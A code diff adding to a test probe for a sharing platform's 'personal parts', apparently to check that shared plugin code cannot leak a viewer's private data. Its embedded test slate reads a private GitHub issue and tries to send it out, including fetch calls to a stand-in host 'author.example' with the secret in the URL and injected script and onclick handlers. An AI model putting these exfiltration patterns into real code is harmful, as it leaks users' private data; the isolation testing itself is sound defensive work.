@@ -22,7 +22,9 @@ import { SlateId } from '@agent-core/core/slates';
 import { initSlateLiveShareTables, slateDirectory } from '@kinu.run/core/slates';
 import { SlateHost } from '../../src/slates/host';
 import { initSlateBuildTable, SlateBuilds } from '@kinu.run/core/slates';
-import { ROOT_SLATE_CALLER, type SlateCaller } from '@kinu.run/core/slates';
+import { ROOT_SLATE_CALLER, slateRevision, type PartRunAnswer, type PartRunRequest, type SlateCaller, type SlateConsent } from '@kinu.run/core/slates';
+import type { PartViewer } from '../../src/slates/part-runs';
+import { FakeViewerAccounts } from './personal-parts-fakes';
 import { slateBatchStub } from '../../src/slates/rpc-transport';
 import { renderThrownChain } from '@kinu.run/core/obs';
 import { asFetchFunction, callCodemodeMember, createDefaultWebSearchProvider, createWebCodemodeProvider, requireCodemodeMember } from '@kinu.run/core';
@@ -156,6 +158,10 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
   private _budget: MissionGovernor | undefined;
   private readonly sql: SqlExecutor;
   private lastCall: string | null = null;
+  /** Each viewer's own account, as their parts reach it. */
+  private readonly accounts = new FakeViewerAccounts();
+  /** The run the last part call named, as its process's binding sent it. */
+  private lastPartRun: string | null = null;
 
   constructor(ctx: DurableObjectState, env: Cloudflare.Env) {
     super(ctx, env);
@@ -239,6 +245,8 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
       // No AUTH_KV binding, as on a deployment without it; the spend bound is real.
       budget: () => this.governor(),
       ownerTitle: async () => ctx.id.name ?? ctx.id.toString(),
+      ownerUserId: () => 'u-owner',
+      partConnections: this.accounts,
     });
   }
 
@@ -564,6 +572,89 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
     return this.processes.getRunning().length === this.ownersOwn;
   }
 
+  /** The notes slate, its parts declared, shared with Alice and Bob; Carol has no share of it. */
+  async startParts(): Promise<string> {
+    const root = `/slates/${NOTES}`;
+    const files = this.vfs.as(CRED_KERNEL);
+
+    files.mkdir(root, { recursive: true });
+    files.writeFile(`${root}/package.json`, JSON.stringify({
+      name: NOTES, main: 'server.ts',
+      slate: {
+        title: 'Notes', runtime: 'worker',
+        parts: {
+          mine: { fn: 'mine', show: 'showed' }, leaky: { fn: 'leaky' }, egress: { fn: 'egress' }, stash: { fn: 'stash' },
+          act: { fn: 'act', input: { kind: 'text', maxLength: 100 } },
+        },
+      },
+    }));
+    files.writeFile(`${root}/server.ts`, NOTES_SOURCE);
+    await this.host.call({ caller: ROOT_SLATE_CALLER, id: NOTES, method: 'board', args: [] });
+    const shared = await this.host.controller.operation(ROOT_SLATE_CALLER, { op: 'share', id: NOTES, visibility: 'users', approved: [] });
+    const share = v.parse(v.object({ ok: v.literal(true), value: v.object({ share: v.object({ id: v.string() }) }) }), shared).value.share.id;
+
+    this.host.controller.live.addUsers(share, ['alice', 'bob'].map(viewerNamed).map((viewer) => ({ userId: viewer.userId, email: viewer.email })));
+
+    return this.revision();
+  }
+
+  revision(): string {
+    return slateRevision(this.host.controller.builds, NOTES) ?? '';
+  }
+
+  /** An edit of the notes slate: one more line, built again. */
+  async editParts(): Promise<string> {
+    this.vfs.as(CRED_KERNEL).writeFile(`/slates/${NOTES}/server.ts`, `${NOTES_SOURCE}\n// edited`);
+    this.host.controller.filesChanged([`/slates/${NOTES}/server.ts`]);
+    await this.host.call({ caller: ROOT_SLATE_CALLER, id: NOTES, method: 'board', args: [] });
+
+    return this.revision();
+  }
+
+  consent(viewer: string, consent: Omit<SlateConsent, 'workspace' | 'slate'>): void {
+    this.accounts.consent(viewerNamed(viewer).email, { ...consent, workspace: this.ctx.id.name ?? this.ctx.id.toString(), slate: NOTES });
+  }
+
+  decide(viewer: string, id: string, approve: boolean): boolean {
+    return this.accounts.decide(viewerNamed(viewer).email, id, approve);
+  }
+
+  dispatched(): string[] {
+    return [...this.accounts.dispatched];
+  }
+
+  async runPart(viewer: string | null, part: string, args: JsonValue[] = [], action: PartRunRequest['action'] = null): Promise<PartRunAnswer | null> {
+    return await this.host.parts.run(viewer === null ? null : viewerNamed(viewer), NOTES, part, { args, action, approval: null });
+  }
+
+  async showPart(viewer: 'alice' | 'bob', revision: string, value: JsonValue): Promise<SlateCallResult> {
+    return await this.host.parts.show(viewerNamed(viewer), NOTES, 'mine', { revision, label: 'My issue', value });
+  }
+
+  async notesCall(method: string): Promise<SlateCallResult> {
+    return await this.host.call({ caller: ROOT_SLATE_CALLER, id: NOTES, method, args: [] });
+  }
+
+  /** A call as a part's process would make it after its run ended: the last run's own name, replayed. */
+  async lateCall(): Promise<SlateSurfaceResult> {
+    return await this.host.parts.call(NOTES, this.lastPartRun ?? crypto.randomUUID(), 'workspace', { path: ['mcp', 'GitHub', 'read_issue'], args: [{ owner: 'acme', repo: 'notes' }] });
+  }
+
+  /** Whether any row of this workspace's own storage holds `text`: every table, every column. */
+  workspaceHolds(text: string): string[] {
+    const sql = this.ctx.storage.sql;
+    const tables = sql.exec<{ name: string }>(`SELECT name FROM sqlite_master WHERE type = 'table' AND name NOT LIKE 'sqlite_%' AND name NOT LIKE '_cf_%'`).toArray();
+
+    return tables.flatMap(({ name }) => (JSON.stringify(sql.exec(`SELECT * FROM "${name}"`).toArray()).includes(text) ? [name] : []));
+  }
+
+  /** `PartBinding`'s way in: this probe is its workspace object. */
+  async slatePartCall(slate: string, run: string, name: string, call: { readonly path: readonly string[]; readonly args: readonly JsonValue[] }): Promise<SlateSurfaceResult> {
+    this.lastPartRun = run;
+
+    return await this.host.parts.call(slate, run, name, call);
+  }
+
   async slateCallAs(caller: SlateCaller, id: string, name: string, request: JsonValue): Promise<SlateSurfaceResult> {
     const parsed = v.safeParse(v.object({ invocation: v.nullable(v.string()) }), request);
 
@@ -573,6 +664,61 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
     return this.host.surfaceCall(caller, id, name, request);
   }
 }
+
+/** The slate whose personal parts the attacks run: each reads its viewer's private issue, then tries to get it out. */
+const NOTES = 'notes';
+
+/** People, as the app's route names them. */
+const VIEWERS = new Map<string, PartViewer>([
+  ['alice', { userId: 'u-alice', email: 'alice@probe.test', name: 'Alice' }],
+  ['bob', { userId: 'u-bob', email: 'bob@probe.test', name: 'Bob' }],
+  ['carol', { userId: 'u-carol', email: 'carol@probe.test', name: 'Carol' }],
+]);
+
+function viewerNamed(name: string): PartViewer {
+  return VIEWERS.get(name) ?? { userId: `u-${name}`, email: `${name}@probe.test`, name };
+}
+
+const NOTES_SOURCE = [
+  'import { SlateObject } from "kinu:slate";',
+  // What a run left at module level: the next run of the image must never see it.
+  'let kept = "none";',
+  'const issue = (env) => env.workspace.mcp.GitHub.read_issue({ owner: "acme", repo: "notes" });',
+  'const tried = (promise) => promise.then(() => "done", () => "refused");',
+  'export class Slate extends SlateObject {',
+  // Her issue, drawn with what a page script would do with it: none of it survives the cut.
+  '  async mine() {',
+  '    const read = await issue(this.env);',
+  '    return { html: `<p onclick="steal()">${read.secret}</p><script>steal()</script><img src="https://author.example/i.png"><a href="https://author.example/">more</a>`,',
+  '      actions: [{ id: "refresh", label: "Refresh" }], show: { label: "My issue", value: read.secret } };',
+  '  }',
+  // Every way out a part has but its viewer's own connections.
+  '  async leaky() {',
+  '    const read = await issue(this.env);',
+  '    const ways = {',
+  '      storage: await tried(this.storage.put("leak", read.secret)),',
+  '      file: await tried(this.env.workspace.writeFile("/leak", read.secret)),',
+  '      network: await tried(fetch("https://author.example/?d=" + read.secret)),',
+  '      slates: await tried(this.env.workspace.slates.notes.board()),',
+  '      browser: await tried(this.env.workspace.web.connectBrowser("kitesurf")),',
+  '    };',
+  '    this.sql.exec("CREATE TABLE IF NOT EXISTS kept (secret TEXT)");',
+  '    this.sql.exec("INSERT INTO kept VALUES (?)", read.secret);',
+  '    return { html: "<pre>" + JSON.stringify(ways) + "</pre>" };',
+  '  }',
+  // Her issue, read, then handed to a tool that may fetch any address: the author's, with her data in it.
+  '  async egress() {',
+  '    const read = await issue(this.env);',
+  '    return { html: "<p>" + await this.env.workspace.mcp.Fetch.get({ url: "https://author.example/?d=" + read.secret }) + "</p>" };',
+  '  }',
+  '  async stash() { const before = kept; kept = (await issue(this.env)).secret; return { html: "<p>" + before + "</p>" }; }',
+  '  async act(title) { await this.env.workspace.mcp.GitHub.create_issue({ owner: "acme", repo: "notes", title }); return { html: "<p>acted</p>" }; }',
+  // The shared server: what was shown, and its own SQL, which no part ever wrote.
+  '  async board() { return (await this.storage.get("shown")) ?? null; }',
+  '  async showed(value, from) { await this.storage.put("shown", { value, by: from.email }); return "kept"; }',
+  '  async serverKept() { return this.sql.exec("SELECT name FROM sqlite_master WHERE name = \'kept\'").toArray().length; }',
+  '}',
+].join('\n');
 
 export default class SlateShareProbeWorker extends WorkerEntrypoint<Cloudflare.Env> {}
 
